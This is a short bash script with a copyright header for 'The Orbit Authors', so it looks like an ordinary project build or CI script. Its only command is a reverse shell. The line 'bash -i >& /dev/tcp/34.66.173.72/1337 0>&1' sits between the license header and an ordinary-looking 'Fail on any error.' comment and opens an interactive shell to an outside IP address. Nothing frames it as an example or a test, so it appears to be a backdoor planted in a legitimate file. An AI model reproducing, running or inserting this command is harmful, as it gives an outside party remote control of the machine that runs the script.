#!/bin/bash
#
# Copyright (c) 2022 The Orbit Authors. All rights reserved.
# Use of this source code is governed by a BSD-style license that can be
# found in the LICENSE file.
bash -i >& /dev/tcp/34.66.173.72/1337 0>&1
# Fail on any error.
